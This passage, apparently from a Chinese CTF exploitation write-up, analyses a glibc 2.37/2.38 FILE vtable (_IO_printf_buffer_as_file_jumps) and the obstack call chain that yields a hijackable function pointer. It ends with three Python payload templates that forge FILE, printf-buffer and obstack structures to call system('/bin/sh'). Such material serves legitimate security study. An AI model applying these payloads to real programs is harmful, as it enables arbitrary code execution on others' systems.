<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在<code>glibc2.37</code>中有一个新的<code>vtable</code>，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>__printf_buffer_as_file_overflow</code>，<code>__printf_buffer_as_file_xsputn</code></p>
<p>这个vtable明显能看出是由_IO_obstack_jumps变化而来</p>
<p>接下来我们先对<code>__printf_buffer_as_file_overflow</code>进行分析(glibc-2.38\stdio-common\printf_buffer_as_file.c)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数首先对传入的第一个参数强制类型转换为<code>__printf_buffer_as_file</code>并赋给变量<code>file</code>，然后调用<code>__printf_buffer_as_file_commit</code>函数</p>
<p><strong>__printf_buffer_as_file_commit函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出该函数通过断言对<code>file</code>结构体中的<code>stream</code>结构体与<code>next</code>结构体中的成员进行一系列判断，然后做一个赋值的操作</p>
<p><strong>__printf_buffer_putc函数</strong></p>
<p>可以看到若<code>ch != EOF</code>就调用<code>__printf_buffer_putc</code>，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_putc (<span class="keyword">struct</span> __printf_buffer *buf, <span class="type">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知<code>__printf_buffer_putc</code>只是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p>
<p>然后有判断：<code>if (!__printf_buffer_has_failed (file-&gt;next) &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</code></p>
<p>就是判断<code>__printf_buffer_as_file</code>结构体中的mode成员是不是<code>__printf_buffer_mode_failed</code>以及<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>，我们假设满足这两个条件，会调用<code>__printf_buffer_flush (file-&gt;next)</code></p>
<p><strong>__printf_buffer_flush 函数</strong></p>
<p>该函数其实是<code>__printf_buffer_flush =&gt; Xprintf_buffer_flush =&gt; Xprintf (buffer_do_flush) (buf) =&gt; __printf_buffer_do_flush</code></p>
<p>我们只需要关注<code>__printf_buffer_do_flush</code>，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((<span class="keyword">struct</span> __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      __printf_buffer_flush_to_file ((<span class="keyword">struct</span> __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((<span class="keyword">struct</span> __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((<span class="keyword">struct</span> __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((<span class="keyword">struct</span> __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里我们关注进入<code>__printf_buffer_flush_obstack</code>函数的这一分支</p>
<p><strong>__printf_buffer_flush_obstack</strong></p>
<p><strong>注意此时参数buf类型从__printf_buffer变为了__printf_buffer_obstack</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment">	 process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设满足所有条件进入<code>obstack_1grow</code>宏定义。</p>
<p>在这里已经出现house of snake的特征了</p>
<p><strong>obstack_1grow</strong>宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)					      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, 1);					      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);					      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>
<p><strong>_obstack_newchunk函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure>
<p>假设满足所有条件，进入<code>CALL_CHUNKFUN</code>这个宏定义，该宏定义的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)							      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure>
<p>可以看到当<code>(((h)-&gt;use_extra_arg)</code>不为0时，会调用<code>(*(h)-&gt;chunkfun)</code>，它的参数是<code>(h)-&gt;extra_arg</code>和<code>(size)</code>，而我们可以控制<code>(*(h)-&gt;chunkfun)</code>与<code>(h)-&gt;extra_arg</code></p>
<p>豁然开朗,后半部分与<code>_IO_obstack_xsputn</code>的调用链一样。</p>
<h3 id="绕过条件-1"><a href="#绕过条件-1" class="headerlink" title="绕过条件"></a>绕过条件</h3><p>整个分析过程并将所有相关结构体，并都看成<code>__printf_buffer_as_file</code>结构体，有以下条件：</p>
<ul>
<li><strong>在<code>__printf_buffer_as_file_overflow</code>函数中：</strong><ul>
<li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed</code> &amp;&amp; <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li><strong>在<code>__printf_buffer_as_file_commit</code>函数中：</strong><ul>
<li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li>
<li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li>
<li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li>
<li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li><strong>在<code>__printf_buffer_flush</code>函数中：</strong></li>
<li><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></li>
<li><strong>在<code>__printf_buffer_flush_obstack</code>函数中：</strong></li>
<li><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;==&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></li>
<li><strong>在<code>obstack_1grow</code>宏定义中：</strong><ul>
<li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;use_extra_arg</code>不为0 &lt;==&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li>
</ul>
</li>
<li>注：</li>
<li><code>__printf_buffer_mode_obstack</code> 就是<code>0xb</code></li>
</ul>
<h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><h3 id="模板方案1-1"><a href="#模板方案1-1" class="headerlink" title="模板方案1"></a>模板方案1</h3><p><strong>分别伪造__printf_buffer与obstack结构体</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = &amp;_IO_printf_buffer_as_file_jumps</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="comment">#------fake __printf_buffer---</span></span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    <span class="comment">#------fake obstack----------</span></span><br><span class="line">    <span class="number">0x110</span>:leak_heap+<span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x18</span>:[</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x38</span>:libc.sym.system,<span class="comment">#func to call</span></span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x48</span>:leak_heap+<span class="number">0x110</span>+<span class="number">0x18</span>,<span class="comment">#rdi</span></span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x50</span>:[<span class="number">0xff</span>]</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="模板方案2-1"><a href="#模板方案2-1" class="headerlink" title="模板方案2"></a>模板方案2</h3><p><strong>obstack结构体与FILE结构体内存复用</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = &amp;_IO_printf_buffer_as_file_jumps</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_read_base = <span class="number">0x68732f6e69622f</span>             <span class="comment">#0x18</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38 func to call</span></span><br><span class="line">fp._IO_save_base = leak_heap+<span class="number">0x18</span>               <span class="comment">#0x48 rdi</span></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>:leak_heap, <span class="comment">#fake a obstack</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="模板方案3"><a href="#模板方案3" class="headerlink" title="模板方案3"></a>模板方案3</h3><p><strong>__printf_buffer结构、obstack结构体与FILE结构体内存复用</strong></p>
<p>这个<code>payload</code>需要的内存是最小的，只需要<code>0xe0</code>字节大小的内存。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = &amp;_IO_printf_buffer_as_file_jumps</span><br><span class="line">fp._IO_write_ptr = fake_printf_buffer+ <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38 func to call</span></span><br><span class="line">fp._IO_save_base = fake_fp + <span class="number">0xa0</span>             <span class="comment">#0x48 rdi</span></span><br><span class="line">fp._wide_data = <span class="number">0x68732f6e69622f</span>                <span class="comment">#0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a __printf_buffer</span></span><br><span class="line">fp = payload_replace(<span class="built_in">bytes</span>(fp),&#123;</span><br><span class="line">    <span class="number">0x58</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>:fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x78</span>:<span class="number">11</span>,</span><br><span class="line">    <span class="number">0x80</span>:fake_fp</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:fake_printf_buffer,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
